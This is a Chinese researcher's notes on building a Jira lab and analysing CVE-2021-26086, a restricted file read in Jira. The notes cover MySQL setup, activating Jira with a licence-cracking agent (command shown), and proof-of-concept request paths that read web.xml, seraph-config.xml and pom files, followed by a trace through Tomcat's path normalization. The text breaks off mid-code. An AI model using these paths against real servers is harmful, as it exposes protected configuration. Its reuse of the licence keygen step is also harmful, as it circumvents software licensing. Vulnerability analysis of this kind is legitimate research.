2022/2/22 17:19
1.md
ﬁle:///Users/s3gundo/Documents/markdown/vulns/java/jira/1.md
1/18
jira环境搭建及受限⽂件读取原理和深思CVE-
2021-26086
⼀、踩坑
坑太多了 装了差不多七⼋个⼩时才装好 也是给⾃⼰找⼀些经验。不过不得不说在装软件的同时
也学到了⾮常多的东⻄，实战的项⽬感觉就是会有不⼀样的感觉。多动⼿总是会有好处的。
我先发⼏个步骤 然后罗列⼀下我猜到的⼀些坑的点，算是把这个环境给装好了。因为我是mac系
统，参照着⼀个步骤来的，但是中间夹在的另外的，因为不是通⽤的破解插件，怕踩坑了。
⼀、安装步骤
https://blog.csdn.net/pang787559613/article/details/101269073
https://www.jianshu.com/p/da0ddd124be8
前半部分基本按照第⼀个链接，后半部分按照第⼆个链接进⾏配置：
⼆、坑点
其实为了兼容后⾯的软件 mysql5.7的安装是⽐较好的，既可以兼容前⾯⽼版本的软件，后⾯的新
版也会兼容这个。感觉相当于java8⼀样地位的存在。在这⾥我选取的是5.7.31 并且不是⽤
homebrew安装的（感觉坑还挺多的）
⼀、mysql我在安装的过程中其实会遇到经典问题，就是第⼀次登录会拒绝登录，所以⼀般先安
全模式启动，然后修改密码并 flush privilege 就可以了。
⼆、mac上⾯mysql的安装默认不会⽣成 /etc/my.cnf 的配置⽂件，需要⾃⼰touch⼀个并⾃⼰写
⼀个默认的配置。 配置上⾯jira默认需要的字符集和ssl的问题。
因为emoji等表情符号的出现，更⼴泛的编码集需要拥抱时代的变化，所以我们尽可能的再去抛弃
utf8转向utf8mb4，就像jira那样(utf8mb4是utf8的超集，理论上由utf8升级到utf8mb4字符编码
没有任何兼容问题)
https://confluence.atlassian.com/adminjiraserver/connecting-jira-applications-to-m
这是字符集的解决办法 注意mysqld和client下⾯对应的配置别写反了。 
  [client] 
  #jira config 
  default-character-set = utf8mb4 
  default-character-set=utf8mb4 
2022/2/22 17:19
1.md
ﬁle:///Users/s3gundo/Documents/markdown/vulns/java/jira/1.md
2/18
三、之前⼀直按照前⾯的步骤使⽤试⽤版的密钥，后来我去官⽹上⾯查看，使⽤密钥是不需要联
⽹的，所以不是⽹址被ban的问题（况且我还挂了全局代理）。之后我将问题翻译为英⽂，去jira
的社区看看：
  #password   = your_password   
  port        = 3306   
  socket      = /tmp/mysql.sock    
  # Here follows entries for some specific programs   
  # The MySQL server   
  [mysqld] 
  character-set-client-handshake = FALSE 
  character-set-server = utf8mb4
  collation-server = utf8mb4_unicode_ci 
  default-storage-engine=INNODB 
  character_set_server=utf8mb4 
  innodb_default_row_format=DYNAMIC 
  innodb_large_prefix=ON 
  innodb_file_format=Barracuda 
  innodb_log_file_size=2G 
  skip_ssl #这⾥是忽略ssl安全连接的问题 
这是创建jira对应数据库时 添加所需要的数据集 
CREATE DATABASE Jira CHARACTER SET utf8mb4 COLLATE utf8mb4_bin; 
ALTER DATABASE Jira DEFAULT CHARACTER SET = utf8mb4 DEFAULT COLLATE = utf8mb4_bin
检查修改 
mysql> SHOW VARIABLES WHERE Variable_name LIKE 'character\_set\_%' OR Variable_nam
修复&优化所有数据表 
> mysqlcheck -u root -p --auto-repair --optimize --all-databases 
mac上⾯mysql的重启命令 
> sudo /usr/local/mysql/support-files/mysql.server restart
We're unable to confirm that Jira license 
https://community.atlassian.com/t5/Jira-Software-questions/We-re-unable-to-confirm
https://community.atlassian.com/t5/Jira-Software-questions/why-I-have-got-unconfi
得到的答案就是 应该不太存在这种情况，建议看看⽇志 
You can find these in $JIRAHOME/log/atlassian-jira.log  
 $JIRAINSTALL/logs/catalina.out file.  
 然后我就去翻看了这两个⽇志，发现没有激活相关的错误，但是我看到了其他的错误，我之前设置了mysql不需
 jdbc:mysql://address=(protocol=tcp)(host=localhost)(port=3306)/jira?useUnic
2022/2/22 17:19
1.md
ﬁle:///Users/s3gundo/Documents/markdown/vulns/java/jira/1.md
3/18
然后去找了⼀下插件的gitee，发现这个插件⾃带了kengen的功能，这个是插件⾥⾯的破解步
骤：
https://www.cnblogs.com/sanduzxcvbnm/p/13809276.html
我输⼊的：
综上，⼀些jira社区帮助我解决问题的url
Atlassian家族插件
java -jar atlassian-agent.jar -d -m PI:EMAIL -n s3gundo -p jira -o http://
之后会得到 
https://community.atlassian.com/t5/Jira-Software-questions/The-database-setup-is-
https://community.atlassian.com/t5/Jira-Software-questions/why-I-have-got-unconfi
https://community.atlassian.com/t5/Jira-Software-questions/We-re-unable-to-confirm
https://community.atlassian.com/t5/Jira-Software-questions/WARN-Establishing-SSL-
https://community.atlassian.com/t5/Confluence-questions/SSL-errors-with-confluenc
https://community.atlassian.com/t5/Jira-Software-questions/why-I-have-got-unconfi
https://community.atlassian.com/t5/Jira-Software-questions/We-re-unable-to-confirm
https://community.atlassian.com/t5/Jira-Software-questions/The-database-setup-is-
2022/2/22 17:19
1.md
ﬁle:///Users/s3gundo/Documents/markdown/vulns/java/jira/1.md
4/18
https://gitee.com/pengzhile/atlassian-agent 
请⽀持正版
⼆、漏洞复现调试
这⾥的jira home是我们之前设置过了的，然后把web-inf下⾯的lib添加到库就可以了，我⼀般是
整个⽂件夹直接导⼊。
CVE-2021-26086 受限⽂件读取挖掘分析
参考⽂章： https://tttang.com/archive/1323/ 梅⼦酒师傅的 师傅的⽂章中可能有两处笔误。1、
是对url路径的解析2、jiraloginfilter的问题
https://xz.aliyun.com/t/10444
先放poc
set JAVA_OPTS=%JAVA_OPTS% -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=
CATALINA_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,address=60222,suspend=n,serv
/s/cfx/_/;/WEB-INF/web.xml  
/s/cfx/_/;/WEB-INF/decorators.xml  
/s/cfx/_/;/WEB-INF/classes/seraph-config.xml  
2022/2/22 17:19
1.md
ﬁle:///Users/s3gundo/Documents/markdown/vulns/java/jira/1.md
5/18
因为burp抓不到localhost和127.0.0.1的的包，我们得先抓⾃⼰本地ip的包，但是我们之前设置jira
的时候，ip是设置成localhost的，我们在burp上⾯的右上⻆把ip地址更改⼀下，然后host的值也
改⼀下。就可以读取到⽂件了。
这⾥的payload我放为 /s/s3gundo/_/;anythingulike/WEB-INF/web.xml ，具体的分析可以看下
⾯。
1、 filter的初始化
复习⼀下filter的初始化
/s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties  
/s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml  
/s/cfx/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml  
/s/cfx/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties 
稍加改造/s/everything/_/;anythingulike/WEB-INF/web.xml
    org.apache.catalina.Valve#invoke ->StandardWrapperValve.invoke 
    StandardWrapperValve ->> + ApplicationFilterFactory : 1、createFilterChain()创
    ApplicationFilterFactory ->> ApplicationFilterFactory : 1.1、创建FilterChain并初
    ApplicationFilterFactory -->> - StandardWrapperValve : 1.2、返回FilterChain对象
2022/2/22 17:19
1.md
ﬁle:///Users/s3gundo/Documents/markdown/vulns/java/jira/1.md
6/18
filterchain的初始化，跟进 ApplicationFilterFactory.createFilterChain ⽅法，可以看到从
wrapper中获取的http请求⽅法和路径，并将🐟filtermap中匹配得到的路径与请求⽅法，加⼊到
filterChain中
可以看到urlpattern是/*是肯定会被匹配上的。
org.apache.catalina.core.ApplicationFilterChain#doFilter 匹配得到这些filters
可以看到序号九，第⼗个filter就是后⾯的重点。
2、 Jira的正常访问/WEB-INF/受限
2022/2/22 17:19
1.md
ﬁle:///Users/s3gundo/Documents/markdown/vulns/java/jira/1.md
7/18
可以看到 org.apache.catalina.core.StandardContextValve#invoke ⽅法中，
在这⾥，应该是会将访问路径中的 ; 进⾏忽略处理，⽐如对于路
径 /s/s3gundo/_/;anythingulike/WEB-INF/web.xml 将会⾸先取 ; 前的 /s/s3gundo/_/ ，再
取 / 后的 /WEB-INF/web.xml ，最后将两者进⾏拼接得到: /s/s3gundo/_//WEB-INF/web.xml 。
因为这⾥传⼊的时候对url做了转发处理，所以将前⾯的 /s/s3gundo 给删去了，得
到 /;anythinulike/WEB-INF/web.xml ，后⾯会讲到。
返回的值是 //WEB-INF/web.xml
    public static String normalize(String path, boolean replaceBackSlash) { //这⾥
        if (path == null) { 
2022/2/22 17:19
1.md
ﬁle:///Users/s3gundo/Documents/markdown/vulns/java/jira/1.md
8/18
            return null; 
        } else {
            String normalized = path; 
            if (replaceBackSlash && path.indexOf(92) >= 0) { 
                normalized = path.replace('\\', '/');  //存在反斜杠就替换为斜杠 
            } 
            if (!normalized.startsWith("/")) { 
                normalized = "/" + normalized; 
            } 
            boolean addedTrailingSlash = false; 